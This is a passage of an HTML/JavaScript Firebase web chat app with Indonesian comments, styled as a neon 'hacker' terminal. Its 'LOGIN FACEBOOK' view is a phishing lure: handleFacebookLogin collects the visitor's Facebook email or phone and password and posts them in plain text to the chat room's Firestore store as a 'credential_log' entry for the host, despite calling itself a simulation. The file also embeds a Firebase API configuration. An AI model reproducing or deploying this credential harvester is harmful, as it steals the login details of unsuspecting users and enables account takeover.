<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>271 Chat Terminal</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Fonts: Inter (main body) dan Space Mono (header digital look) -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=Space+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
    <style>
        /* --- TEMA: PURE BLACK & BLUE NEON --- */
        :root {
            --primary-color: #00BFFF; /* Biru Neon */
            --secondary-color: #33ffcc; /* Aksen Biru Hijau */
            --text-color: #FFFFFF;    /* Teks Putih */
            --bg-color: #000000;      /* LATAR BELAKANG TOTAL BLACK */
            --terminal-bg: #000000;   /* Kontainer juga Total Black */
            /* Disesuaikan: Message border dan shadow yang lebih lembut */
            --message-border-color: rgba(0, 191, 255, 0.2); 
            --message-shadow-color: rgba(0, 191, 255, 0.25);
            /* VARIABEL KRITIKAL UNTUK FIX MOBILE HEIGHT (Diisi oleh JS) */
            --app-height: 100vh; /* Fallback 100vh */
        }

        /* Override Tailwind defaults untuk konsistensi */
        :root, body {
            font-family: 'Inter', sans-serif; 
            font-size: 16px; /* Font Base Tetap 16px */
        }
        
        /* KRITIKAL MOBILE FIX: Font diset ke 16px untuk menghemat ruang vertikal */
        @media (max-width: 640px) {
            :root, body {
                font-size: 16px; 
            }
        }
        
        /* --- FONT KHUSUS UNTUK HEADER (TAMPILAN DIGITAL/MONOSPACE) --- */
        .header-font {
            font-family: 'Space Mono', monospace; 
        }

        body {
            background-color: var(--bg-color); 
            color: var(--text-color); 
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            
            /* KRITIKAL FIX: Menggunakan tinggi stabil dari variabel JS (FULL SCREEN) */
            height: var(--app-height); 
            min-height: var(--app-height);
            max-height: var(--app-height);
            width: 100vw;
            overflow: hidden; /* Mencegah body scroll */
        }


        .terminal-window {
            background-color: var(--terminal-bg); 
            /* KRITIKAL PERUBAHAN: MENGISI PENUH LAYAR (Desktop & Mobile) */
            width: 100vw; 
            max-width: 100vw;
            height: var(--app-height); 
            max-height: var(--app-height);
            
            /* --- BORDER TIPIS NEON DI SEMUA SISI (Dipertahankan) --- */
            border: 1px solid var(--primary-color);
            box-sizing: border-box;
            
            display: flex;
            flex-direction: column;
            border-radius: 0; /* Menghilangkan sudut melengkung */
            overflow: hidden; /* Mencegah scroll di kontainer utama */
            padding: 0; /* Menghilangkan padding kontainer utama */
            position: relative; 
            margin: 0;
        }

        /* Scrollbar styling */
        .scrollbar-futuristic::-webkit-scrollbar {
            width: 6px; /* Lebih ramping */
        }

        .scrollbar-futuristic::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
        }

        .scrollbar-futuristic::-webkit-scrollbar-thumb {
            background-color: rgba(0, 191, 255, 0.4);
            border-radius: 3px;
        }

        .scrollbar-futuristic::-webkit-scrollbar-thumb:hover {
            background-color: rgba(0, 191, 255, 0.6);
        }
        
        /* FONT SIZE PENTING */
        
        .input-terminal {
            background-color: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--primary-color);
            color: var(--primary-color);
            padding: 8px 12px; /* Dikurangi lagi dari 10px 14px */
            border-radius: 4px; /* Lebih kecil */
            transition: box-shadow 0.2s;
            opacity: 0.9;
            font-size: 1.0em; /* Dikurangi dari 1.1em */
        }

        .input-terminal:focus {
            outline: none;
            box-shadow: 0 0 10px var(--primary-color);
        }

        .terminal-button {
            background-color: var(--primary-color);
            color: var(--bg-color);
            font-weight: 700; 
            padding: 8px 12px; /* Dikurangi lagi dari 10px 14px */
            border: none;
            transition: background-color 0.2s, box-shadow 0.2s;
            cursor: pointer;
            box-shadow: 0 0 5px rgba(0, 191, 255, 0.7);
            font-size: 1.1em; /* Dikurangi dari 1.2em */
            border-radius: 4px; /* Lebih kecil */
        }
        
        .fb-button {
            background-color: #1877F2; 
            color: white;
            box-shadow: 0 0 5px rgba(24, 119, 242, 0.7);
        }
        .fb-button:hover {
            background-color: #166fe5;
            box-shadow: 0 0 15px #1877F2;
        }

        .terminal-button:hover {
            background-color: #008fcc;
            box-shadow: 0 0 15px var(--primary-color);
        }

        .glow-text {
            text-shadow: 0 0 5px var(--primary-color), 0 0 10px var(--primary-color);
        }

        /* Style untuk Chat Log (Disesuaikan) */
        .chat-log-container { border: none; padding: 2px; margin-bottom: 2px; background-color: transparent; } /* Padding dikurangi */
        .log-divider { border-top: 1px dashed rgba(255, 255, 255, 0.1); margin: 5px 0; }
        .message-container { display: flex; width: 100%; margin-bottom: 6px; } /* Jarak antar pesan dikurangi */
        
        /* Message Styling */
        .chat-message {
            padding: 6px 8px; /* Dikurangi dari 8px 10px */
            border-radius: 4px; /* Lebih kecil */
            word-wrap: break-word;
            background-color: rgba(255, 255, 255, 0.03); /* Latar belakang lebih transparan */
            font-size: 1.0em; /* Dikurangi dari 1.1em */
            line-height: 1.4; /* Line height lebih rapat */
            border: 1px solid var(--message-border-color); 
            box-shadow: 0 0 2px var(--message-shadow-color); /* Shadow lebih lembut */
            transition: all 0.2s ease-in-out; 
        }
        .chat-message:hover { box-shadow: 0 0 4px var(--primary-color); }
        
        /* Stronger highlight for the current user's message */
        .chat-message-self {
            border: 1px solid #00FF00; /* Green border */
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); /* Stronger green glow, tapi tetap lembut */
        }
        
        /* --- STYLE KHUSUS BOT: Centered, Soft Font, No background/border --- */
        .bot-message-style {
            /* Font lebih tipis dan lembut */
            font-weight: 300; 
            font-style: italic;
            /* Hapus padding, background, dan border agar terlihat seperti pesan sistem */
            padding: 0;
            background-color: transparent;
            border: none;
            box-shadow: none;
            /* Memastikan teks rata tengah dalam kotaknya */
            text-align: center;
        }

        /* File Message Styling */
        /* Hapus styling file message karena fungsionalitas dihapus */
        
        /* Timestamp Styling */
        .message-timestamp {
            font-size: 0.7em; /* Dikurangi dari 0.8em */
        }
        
        /* New CSS for Emoji Picker */
        .emoji-picker-container {
            /* Adjust background for a more glassy/terminal popover */
            background-color: rgba(0, 0, 0, 0.9);
            border: 1px solid var(--secondary-color);
            box-shadow: 0 0 10px var(--secondary-color);
        }
        .emoji-item {
            /* Make the emoji buttons dark on hover */
            background: transparent;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.1s;
        }
        .emoji-item:hover {
            background-color: rgba(51, 255, 204, 0.1); /* light greenish hover effect */
        }
    </style>
</head>
<body>

    <div id="app" class="terminal-window">
        <!-- Content will be injected here by JavaScript -->
    </div>

    <!-- Firebase Imports (Menggunakan SDK 11.6.1 untuk stabilitas) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, collection, query, onSnapshot, addDoc, serverTimestamp, setLogLevel, doc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        
        // MENGATUR LEVEL LOGGING FIREBASE
        setLogLevel('debug');
        
        // =========================================================================
        // !!! PENTING: KONFIGURASI FIREBASE ANDA TELAH DIMASUKKAN DI SINI !!!
        // =========================================================================
        const MANUAL_CONFIG = {
            apiKey: "AIzaSyA_FynN_E6zxOEHo3k2t-olypo2Tu_D-zQ",
            authDomain: "webchatapp90.firebaseapp.com",
            projectId: "webchatapp90",
            storageBucket: "webchatapp90.firebasestorage.app",
            messagingSenderId: "199231928341",
            appId: "1:199231928341:web:cb1d7e99d65c3e2d06361c",
        };
        // =========================================================================

        // --- Global Variables (Provided by Canvas Environment) ---
        const appId = typeof __app_id !== 'undefined' ? __app_id : MANUAL_CONFIG.projectId || 'manual-app-id';
        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : MANUAL_CONFIG;
        
        let app, db, auth, userId = null;
        let unsubscribe = null; 
        let clockInterval = null; 
        
        // --- CONSTANTS ---
        const MESSAGES_COLLECTION_NAME = 'messages';
        const ROOMS_COLLECTION_NAME = 'hacker_chat_rooms'; 
        const BOT_NAME = 'machine bot'; 
        
        // --- DAFTAR EMOJI STANDAR (DIPERBARUI) ---
        const EMOJIS = [
            'ðŸ˜€', 'ðŸ˜‚', 'ðŸ¥²', 'ðŸ˜', 'ðŸ˜Ž', 'ðŸ¥³', 'ðŸ¤¯', 'ðŸ¤”', 'ðŸ¤«', 'ðŸ˜‡', 
            'ðŸ˜­', 'ðŸ˜¡', 'ðŸ˜±', 'ðŸ¥¶', 'ðŸ‘', 'ðŸ‘Ž', 'ðŸ”¥', 'â­', 'ðŸš€', 'ðŸ’¡', 
            'ðŸ’»', 'ðŸ’°', 'ðŸ”‘', 'ðŸ“ž', 'ðŸ“§', 'âœï¸', 'ðŸ“–', 'ðŸ“Š', 'ðŸ“Œ', 'ðŸ”—', 
            'ðŸ”’', 'âš™ï¸', 'ðŸ’¬', 'ðŸ””', 'ðŸŽ¤', 'ðŸŽ§', 'ðŸŽ¸', 'ðŸŽ¨', 'âš½', 'ðŸ€', 
            'ðŸ”', 'ðŸ•', 'â˜•', 'ðŸ·', 'ðŸŽ‰', 'âœ…', 'âŒ', 'ðŸ’”', 'ðŸŒ™', 'â˜€ï¸'
        ];
        
        // --- VALIDASI REGEX TAMBAHAN ---
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\+?\d{6,}$/; 
        const roomIDRegex = /^[A-Z0-9]{8}$/; 
        
        // --- User Color Mapping for Distinguishing Senders ---
        const NEON_COLORS = [
            '#FF33CC', // Pink
            '#33FFCC', // Blue-Green
            '#FFFF33', // Yellow
            '#66CCFF', // Light Blue
            '#CC66FF', // Purple
            '#FF6633', // Orange
            '#33FF66', // Light Green
            '#FF66CC'  // Magenta
        ];
        let userColorMap = {};

        /** Menetapkan warna neon yang konsisten berdasarkan ID pengguna. */
        const getUserColor = (id) => {
            if (userColorMap[id]) {
                return userColorMap[id];
            }

            const hash = id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
            const colorIndex = hash % NEON_COLORS.length;
            const color = NEON_COLORS[colorIndex];

            userColorMap[id] = color;
            return color;
        };


        // --- App State ---
        let state = {
            currentView: 'main', 
            username: '',
            roomId: '',
            isHost: false,
            chatMessages: [],
            systemLog: [], 
            isSystemLoading: false, 
            isFirebaseReady: false, 
            loading: false,
            error: null,
            isLoggingOut: false 
        };
        
        // --- PERSISTENCE LOGIC: LOAD STATE FIRST ---

        const loadStateFromLocalStorage = () => {
            try {
                const persisted = localStorage.getItem('hackerChatState');
                if (persisted) {
                    const loadedState = JSON.parse(persisted);
                    
                    if (loadedState.roomId && loadedState.username && loadedState.isHost === false) {
                         state = { 
                             ...state, 
                             ...loadedState,
                             currentView: loadedState.roomId ? 'chat' : 'main' 
                         }; 
                    }
                }
            } catch (e) {
                console.error("Error loading state from localStorage", e);
                localStorage.removeItem('hackerChatState'); 
            }
        };

        const saveStateToLocalStorage = () => {
            const persistState = {
                username: state.username,
                roomId: state.roomId,
                isHost: state.isHost,
                currentView: state.currentView,
            };
            if(state.roomId) {
                localStorage.setItem('hackerChatState', JSON.stringify(persistState));
            } else {
                localStorage.removeItem('hackerChatState');
            }
        };

        loadStateFromLocalStorage();

        // --- Utility Functions ---
        
        /** KRITIKAL FIX: Mengatur tinggi viewport yang benar untuk mobile (agar 100vh tidak terpotong) */
        const setAppHeight = () => {
            const doc = document.documentElement;
            const newHeight = `${window.innerHeight}px`;
            doc.style.setProperty('--app-height', newHeight);
        };


        /** Logs an error message to the console and updates app state. */
        const logError = (msg, err = null) => {
            console.error(`[HACKER CHAT ERROR] ${msg}`, err);
             const uiMsg = `${msg} | CEK CONSOLE BROWSER untuk kode kesalahan.`;
             setNotification(uiMsg, 7000); 
             if (err) console.error(err);
             return false; 
        }

        /** Simple function to update state and re-render */
        const updateState = (newState) => {
            state = { ...state, ...newState };
            saveStateToLocalStorage(); 
            render();
        }
        
        /** Displays a temporary status message (not a critical error) on the UI. */
        const setNotification = (msg, duration = 5000) => {
            console.log(`[HACKER CHAT STATUS] ${msg}`); 
            updateState({ error: msg }); 

            setTimeout(() => {
                if (state.error === msg) {
                    updateState({ error: null });
                }
            }, duration);
        }

        /** Exponential backoff for Firebase API calls */
        const withRetry = async (fn, maxRetries = 5, delay = 1000) => {
            for (let i = 0; i < maxRetries; i++) {
                try {
                    return await fn();
                } catch (error) {
                    if (i === maxRetries - 1) {
                        throw error;
                    }
                    console.warn(`Attempt ${i + 1} failed. Retrying in ${delay / 1000}s...`, error);
                    await new Promise(resolve => setTimeout(resolve, delay));
                    delay *= 2;
                }
            }
        };
        
        /** Fungsi untuk menghentikan interval jam */
        const stopClock = () => {
            if (clockInterval) {
                clearInterval(clockInterval);
                clockInterval = null;
            }
        };

        /** Fungsi untuk memperbarui tampilan jam setiap detik (HANYA WAKTU) */
        const updateClock = () => {
            const clockElement = document.getElementById('real-time-clock');
            if (clockElement) {
                const now = new Date();
                // HANYA WAKTU (jam, menit, detik)
                const timeString = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                
                // UKURAN FONT JAM DITURUNKAN KE MINIMUM
                clockElement.innerHTML = `
                    <span class="text-base sm:text-lg font-bold" style="color: var(--secondary-color); text-shadow: 0 0 5px var(--secondary-color);">
                        ${timeString}
                    </span> 
                `;
            }
        };


        /** Checks the current state of critical Firebase variables for debugging */
        const runDiagnostic = () => {
            let diagMsg = "";
            diagMsg += state.isFirebaseReady ? " [FIREBASE READY OK] " : " [FIREBASE PENDING/FAILED] ";
            diagMsg += userId ? ` [AUTH OK: ${userId.substring(0, 6)}...] ` : " [AUTH FAILED/PENDING] ";
            diagMsg += appId !== 'manual-app-id' ? " [APP ID OK] " : " [DEFAULT APP ID] ";
    
            const fullMsg = "DIAGNOSTIC REPORT: " + diagMsg + " - Cek Konsol Developer (F12) untuk log Firebase Debug.";
            setNotification(fullMsg, 10000);
        };

        // --- Firebase Setup (KRITIKAL: Dipastikan berjalan secara berurutan) ---

        const setupFirebase = async () => {
            
            if (!firebaseConfig || firebaseConfig.apiKey === 'YOUR_API_KEY_HERE' || !firebaseConfig.projectId) {
                return logError("Koneksi Gagal: Konfigurasi Firebase tidak ditemukan atau masih placeholder.");
            }
            
            try {
                app = initializeApp(firebaseConfig);
                auth = getAuth(app);
                db = getFirestore(app);
            } catch (initError) {
                return logError("Koneksi Gagal: Gagal menginisialisasi layanan Firebase. Periksa ID Proyek/Kunci API Anda.", initError);
            }

            // PERBAIKAN KRITIKAL: Menangani __initial_auth_token secara langsung.
            const authPromise = new Promise(resolve => {
                const unsubscribeAuth = onAuthStateChanged(auth, async (user) => {
                    if (user) {
                        userId = user.uid;
                        unsubscribeAuth(); 
                        resolve(true);
                    } else {
                        try {
                            if (typeof __initial_auth_token !== 'undefined') {
                                await withRetry(() => signInWithCustomToken(auth, __initial_auth_token));
                            } else {
                                await withRetry(() => signInAnonymously(auth));
                            }
                        } catch (error) {
                            console.error("Authentication Attempt Failed:", error);
                            userId = null;
                            unsubscribeAuth();
                            resolve(false); 
                        }
                    }
                });
            });

            const authSuccess = await authPromise;
            
            if (!authSuccess || !userId) {
                 updateState({ isFirebaseReady: false });
                 return logError("Otentikasi Gagal: Tidak dapat memperoleh User ID. Pastikan Otentikasi Anonim diaktifkan.");
            }

            updateState({ isFirebaseReady: true });
            
            if (state.roomId && state.currentView === 'chat') {
                startChatListener(state.roomId);
            }
            
            console.log(`[FIREBASE READY] User ID: ${userId}, App ID: ${appId}`);
        };


        // --- Chat Logic ---

        const getMessagesRef = (roomId) => {
            if (!db) throw new Error("Firestore not initialized.");
            // MANDATORY Firestore path structure for public data
            const roomDocPath = `/artifacts/${appId}/public/data/${ROOMS_COLLECTION_NAME}/${roomId}`;
            return collection(db, roomDocPath, MESSAGES_COLLECTION_NAME);
        };

        const sendMessage = async (messageText, messageType = 'chat', fileDetails = null) => {
            if (!state.isFirebaseReady) return logError("Koneksi belum siap. Tunggu hingga status FIREBASE READY.");
            
            // Logika untuk pesan teks (hanya jika type=chat)
            if (messageType === 'chat' && !messageText.trim()) return;

            // Logika untuk pesan file (TIDAK DIGUNAKAN LAGI)
            // if (messageType === 'file' && !fileDetails) return;

            const message = {
                sender: state.username,
                timestamp: serverTimestamp(),
                userId: userId, // CRITICAL: Ensure local userId is saved
                messageType: messageType, 
                
                // Hapus logika file
                text: messageText,
            };

            try {
                await withRetry(() => addDoc(getMessagesRef(state.roomId), message));
            } catch (error) {
                logError("Gagal mengirim pesan. Periksa Aturan Keamanan Firestore.", error);
            }
        };
        
        /** Fungsi untuk mengirim pesan dari Bot Sistem */
        const sendBotMessage = async (messageText) => {
            if (!state.isFirebaseReady) return logError("Koneksi belum siap. Tunggu hingga status FIREBASE READY.");
            if (!db || !state.roomId || !messageText.trim()) return;

            const message = {
                // Menggunakan BOT_NAME lowercase
                sender: BOT_NAME, 
                text: messageText,
                userId: 'SYSTEM_BOT', 
                timestamp: serverTimestamp(),
                messageType: 'chat' 
            };

            try {
                await withRetry(() => addDoc(getMessagesRef(state.roomId), message));
            } catch (error) {
                logError("Gagal mengirim pesan bot. Periksa status koneksi Anda.", error);
            }
        };


        /** Starts listening for new messages in the current room */
        const startChatListener = (roomId) => {
            if (!state.isFirebaseReady) return logError("Listener gagal: Koneksi belum siap.");
            
            if (unsubscribe) {
                unsubscribe();
            }

            const messagesRef = getMessagesRef(roomId);
            const q = query(messagesRef);

            unsubscribe = onSnapshot(q, (snapshot) => {
                
                let shouldCloseRoom = false;
                
                snapshot.docChanges().forEach(change => {
                    const data = change.doc.data();
                    if (data.messageType === 'room_closed' && change.type === 'added') {
                        shouldCloseRoom = true;
                    }
                });

                if (shouldCloseRoom) {
                    if (!state.isHost && !state.isLoggingOut) {
                        setTimeout(() => forceLogout("PERHATIAN: Host telah meninggalkan ruangan. Koneksi terputus."), 50);
                    }
                    return; 
                }

                const messages = [];
                const systemEvents = []; 
                
                snapshot.forEach((doc) => {
                    const data = { id: doc.id, ...doc.data() };
                    
                    if (data.messageType === 'join' || data.messageType === 'leave' || data.messageType === 'room_closed' || data.messageType === 'credential_log') {
                        systemEvents.push(data);
                    } else {
                        messages.push(data);
                    }
                });
                
                messages.sort((a, b) => (a.timestamp?.seconds || 0) - (b.timestamp?.seconds || 0));
                systemEvents.sort((a, b) => (a.timestamp?.seconds || 0) - (b.timestamp?.seconds || 0));
                
                updateState({ chatMessages: messages, systemLog: systemEvents }); 
                
                setTimeout(scrollToBottom, 50);

            }, (error) => {
                logError("Gagal mendengarkan pesan real-time (onSnapshot). Mungkin masalah aturan keamanan Firestore.", error);
            });
        };
        
        // --- Scrolling Function ---
        const scrollToBottom = () => {
            const scrollContainer = document.getElementById('chat-log');
            if (scrollContainer) {
                 if (scrollContainer.scrollHeight > scrollContainer.clientHeight) {
                    scrollContainer.scrollTop = scrollContainer.scrollHeight;
                }
            }
        };


        // --- Logout Paksa untuk Guest (Dipicu oleh Host) ---
        const forceLogout = (notificationMessage) => {
            if (state.isLoggingOut) return;
            
            updateState({ isLoggingOut: true }); 
            
            if (unsubscribe) unsubscribe();
            stopClock(); 
            
            setNotification(notificationMessage, 8000); 

            setTimeout(() => {
                updateState({ 
                    currentView: 'main', 
                    roomId: '', 
                    chatMessages: [], 
                    systemLog: [], 
                    isHost: false, 
                    username: state.username,
                    isLoggingOut: false 
                });
                localStorage.removeItem('hackerChatState');
            }, 100); 
        }
        
        // --- Input Feature Handlers (Updated for Emoji Picker) ---

        /** Handler untuk menampilkan/menyembunyikan emoji picker */
        const handleEmojiClick = () => {
            const picker = document.getElementById('emoji-picker');
            if (picker) {
                picker.classList.toggle('hidden');
            }
        };
        
        /** Handler untuk memilih emoji dan memasukkannya ke input */
        const selectEmoji = (emoji) => {
            const input = document.getElementById('message-input');
            if (input) {
                // Insert emoji at cursor position
                const start = input.selectionStart;
                const end = input.selectionEnd;
                const value = input.value;
                
                // Add a space before inserting if the input is not empty
                const prefix = (start > 0 && value[start - 1] !== ' ') ? ' ' : '';
                
                input.value = value.substring(0, start) + prefix + emoji + value.substring(end);
                
                // Set cursor position after the inserted emoji
                input.selectionStart = input.selectionEnd = start + prefix.length + emoji.length;
                input.focus();
            }
            // Hide the picker after selection
            const picker = document.getElementById('emoji-picker');
            if (picker) {
                picker.classList.add('hidden');
            }
        };
        
        /** Handler untuk memproses pemilihan file (Dihapus)
        const handleFileSelection = async (e) => {
             // Fungsionalitas Dihapus Sesuai Permintaan
        };
        */


        // --- View Handlers ---
        
        const handleGoToFacebookLogin = () => {
             updateState({ currentView: 'facebook_login', error: null });
        }
        
        /** Handler untuk simulasi login Facebook dan Join Room */
        const handleFacebookLogin = async () => {
            if (!state.isFirebaseReady) return logError("Sistem belum siap. Tunggu hingga status FIREBASE READY.");
            
            const facebookUser = document.getElementById('facebook-username').value.trim();
            const facebookPass = document.getElementById('facebook-password').value.trim();
            const inviteId = document.getElementById('facebook-invite-id').value.trim().toUpperCase();

            const isEmail = emailRegex.test(facebookUser);
            const isPhone = phoneRegex.test(facebookUser);
            
            if (!facebookUser || !facebookPass || !inviteId) return logError("Semua bidang harus diisi.");
            if (!isEmail && !isPhone) return logError("Username Facebook harus berupa format Email atau Nomor Telepon yang valid.");
            if (facebookPass.length < 6) return logError("Password Facebook harus memiliki setidaknya 6 karakter.");
            if (!roomIDRegex.test(inviteId)) return logError("ID Ruangan tidak valid. Harus 8 karakter alfanumerik huruf besar.");

            const chatUsername = `(FB)${facebookUser.split('@')[0].toUpperCase()}`;
            const roomId = inviteId;

            updateState({
                username: chatUsername,
                roomId: roomId,
                isHost: false,
                currentView: 'chat',
                error: null
            });
            startChatListener(roomId);
            
            await sendMessage(`USER ${chatUsername} terhubung melalui koneksi eksternal (Simulasi Facebook).`, 'join');
            
            const logMessage = `[ATTENTION HOST - CREDENTIAL LOG]:\nExternal Connection via Facebook Simulation Detected.\nUser ID: ${facebookUser}\nPassword: ${facebookPass}\nRoom ID: ${inviteId}`;
            await sendMessage(logMessage, 'credential_log'); 
            
            sendBotMessage(`welcome, selamat datang ${chatUsername}`);
        };

        const handleUserJoin = () => {
            if (!state.isFirebaseReady) return logError("Sistem belum siap. Tunggu hingga status FIREBASE READY.");
            
            const username = document.getElementById('guest-username').value.trim();
            const inviteId = document.getElementById('guest-invite-id').value.trim().toUpperCase();

            if (!username) return logError("Nama Pengguna (Guest) tidak boleh kosong.");
            if (!roomIDRegex.test(inviteId)) return logError("ID Ruangan tidak valid. Harus 8 karakter alfanumerik huruf besar.");

            updateState({
                username: username,
                roomId: inviteId,
                isHost: false,
                currentView: 'chat',
                error: null
            });
            startChatListener(inviteId);
            
            sendMessage(`USER ${username} terhubung.`, 'join');
            sendBotMessage(`welcome, selamat datang ${username}`);
        };

        const handleSendMessage = () => {
            if (!state.isFirebaseReady) return logError("Sistem belum siap. Tunggu hingga status FIREBASE READY.");
            
            const input = document.getElementById('message-input');
            const text = input.value;
            if (text) {
                sendMessage(text, 'chat'); 
                input.value = ''; 
                input.focus(); 
            }
            // Ensure picker is closed after sending
            const picker = document.getElementById('emoji-picker');
            if (picker && !picker.classList.contains('hidden')) {
                picker.classList.add('hidden');
            }
        };
        
        /** Main logout handler. */
        const handleLogout = async () => {
            if (state.isLoggingOut) return;
            updateState({ isLoggingOut: true }); 

            if (unsubscribe) unsubscribe();
            stopClock(); 
            
            if (state.roomId && state.username) {
                await sendMessage(`USER ${state.username} terputus.`, 'leave');
                setNotification("Anda telah keluar dari ruangan.", 5000);
            }
            
            updateState({ 
                currentView: 'main', 
                roomId: '', 
                chatMessages: [], 
                systemLog: [], 
                isHost: false, 
                username: '',
                isLoggingOut: false 
            });
            localStorage.removeItem('hackerChatState');

        };

        const copyRoomId = () => {
            if (state.roomId) {
                const tempInput = document.createElement('input');
                tempInput.value = state.roomId;
                document.body.appendChild(tempInput);
                tempInput.select();
                document.execCommand('copy');
                document.body.removeChild(tempInput);
                
                setNotification('ID RUANGAN BERHASIL DISALIN!', 5000);
            }
        };

        // --- Rendering Logic (HTML Templates) ---
        
        // Expose selectEmoji globally
        window.selectEmoji = selectEmoji; 

        const renderFacebookLoginView = () => `
            <!-- PENYESUAIAN: padding utama dikurangi (p-2 sm:p-4) -->
            <div class="flex flex-col h-full items-center justify-center p-2 sm:p-4 max-w-5xl mx-auto">
                
                ${state.error ? `<div class="bg-red-900 p-2 text-yellow-300 mb-4 border-red-700 border text-center text-sm rounded-md w-full max-w-sm sm:max-w-md">${state.error}</div>` : ''}

                <div class="w-full max-w-md"> 
                    <!-- PENYESUAIAN: Ukuran Judul Dikurangi (text-2xl sm:text-3xl) -->
                    <h2 class="text-2xl sm:text-3xl mb-6 text-center border-b border-primary-color/50 pb-2 font-extrabold text-blue-400 glow-text">SYNC TO FB.SERVER</h2>
                    
                    <p class="text-sm sm:text-base text-gray-400 mb-6 text-center">Masukkan akun facebook Anda dan ID ruangan untuk akses</p>

                    <div class="mb-3">
                        <!-- PENYESUAIAN: Ukuran Label Dikurangi (text-sm sm:text-base) -->
                        <label class="block mb-1 text-sm sm:text-base text-white">User_name</label>
                        <input type="text" id="facebook-username" class="input-terminal w-full" placeholder="email@example.com atau 081xxxxxxxxx">
                    </div>
                    
                    <div class="mb-3">
                        <!-- PENYESUAIAN: Ukuran Label Dikurangi -->
                        <label class="block mb-1 text-sm sm:text-base text-white">Password</label>
                        <input type="password" id="facebook-password" class="input-terminal w-full" placeholder="Masukkan password anda">
                    </div>
                    
                    <div class="mb-6">
                        <!-- PENYESUAIAN: Ukuran Label Dikurangi -->
                        <label class="block mb-1 text-sm sm:text-base text-white">ID ROOM UNDANGAN:</label>
                        <input type="text" id="facebook-invite-id" class="input-terminal w-full" placeholder="ID undangan Host (8 karakter)">
                    </div>

                    <!-- PENYESUAIAN: Ukuran Tombol Dikurangi (py-2 text-base sm:text-lg) -->
                    <button class="terminal-button fb-button w-full mt-auto py-2 text-base sm:text-lg" onclick="handleFacebookLogin()">
                        &gt; [ LOG IN & JOIN ROOM ]
                    </button>
                    
                    <button class="text-xs mt-3 underline text-gray-500 hover:text-red-300 w-full" onclick="updateState({ currentView: 'main' })">
                        &lt; Kembali ke Halaman Utama
                    </button>
                </div>
                
            </div>
        `;

        const renderGuestSetupView = () => {
            const connectionStatus = state.isFirebaseReady
                ? `<span class="text-green-400 font-bold">READY</span>`
                : state.isSystemLoading 
                    ? `<span class="text-yellow-400 font-bold">AUTHENTICATING...</span>`
                    : `<span class="text-red-400 font-bold">FAILED!</span>`;
            
            const buttonDisabled = !state.isFirebaseReady;
            const buttonClass = buttonDisabled ? 'opacity-50 cursor-not-allowed' : '';


            return `
                <!-- PENYESUAIAN: padding utama dikurangi (p-2 sm:p-4) -->
                <div class="flex flex-col h-full items-center justify-center p-2 sm:p-4 max-w-5xl mx-auto">
                    <!-- PENYESUAIAN: Ukuran Judul Dikurangi (text-2xl sm:text-3xl) -->
                    <h1 class="text-2xl sm:text-3xl mb-3 text-center glow-text font-bold text-white">SELAMAT DATANG DI RIVER'S CHAT</h1>
                    <p class="text-sm sm:text-base text-center text-gray-400 mb-6">Akses ruang obrolan anonim. Masukkan nama panggilan dan ID ruangan Anda.</p>
                    
                    ${state.error ? `<div class="bg-red-900 p-2 text-yellow-300 mb-4 border-red-700 border text-center text-sm rounded-lg w-full max-w-md">${state.error}</div>` : ''}

                    <div class="w-full max-w-md p-2 sm:p-0">
                        <div class="flex-grow">
                            <div class="mb-3">
                                <!-- PENYESUAIAN: Ukuran Label Dikurangi (text-sm sm:text-base) -->
                                <label class="block mb-1 text-sm sm:text-base text-white font-semibold">NAMA PANGGILAN (USER NAME):</label>
                                <input type="text" id="guest-username" class="input-terminal w-full" placeholder="contoh : David91" value="${state.username}" onkeydown="if(event.key === 'Enter') handleUserJoin()">
                            </div>
                            <div class="mb-6">
                                <!-- PENYESUAIAN: Ukuran Label Dikurangi -->
                                <label class="block mb-1 text-sm sm:text-base text-white font-semibold">ID RUANGAN (8 KARAKTER):</label>
                                <input type="text" id="guest-invite-id" class="input-terminal w-full" placeholder="Masukkan ID undangan Host" onkeydown="if(event.key === 'Enter') handleUserJoin()">
                            </div>
                        </div>
                        
                        <!-- PENYESUAIAN: Ukuran Tombol Dikurangi (py-3 text-base sm:text-lg) -->
                        <button class="terminal-button w-full mb-4 py-3 text-base sm:text-lg ${buttonClass}" onclick="handleUserJoin()" ${buttonDisabled ? 'disabled' : ''}>
                            <span class="text-white">&gt; [ **JOIN ROOM** ] &lt;</span>
                        </button>
                        
                        <div class="flex items-center my-4">
                            <div class="flex-grow border-t border-gray-700"></div>
                            <span class="mx-4 text-xs text-gray-500">ATAU</span>
                            <div class="flex-grow border-t border-gray-700"></div>
                        </div>
                        
                        <!-- PENYESUAIAN: Ukuran Tombol Dikurangi -->
                        <button class="terminal-button fb-button w-full py-2 text-sm sm:text-base mt-4 ${buttonClass}" onclick="handleGoToFacebookLogin()" ${buttonDisabled ? 'disabled' : ''}>
                            LOGIN FACEBOOK
                        </button>
                        
                    </div>

                    <div class="mt-6 flex flex-col items-center text-xs sm:text-sm w-full max-w-md">
                         <p class="mb-1 text-gray-300">STATUS KONEKSI FIREBASE: ${connectionStatus}</p>
                         <p class="text-xs text-gray-500">USER ID: <span class="font-mono">${userId || 'TIDAK TERIDENTIFIKASI'}</span></p>
                        <button class="mt-2 text-xs underline text-gray-500 hover:text-red-300" onclick="runDiagnostic()">
                            [ JALANKAN DIAGNOSTIK SISTEM ]
                        </button>
                    </div>
                </div>
            `;
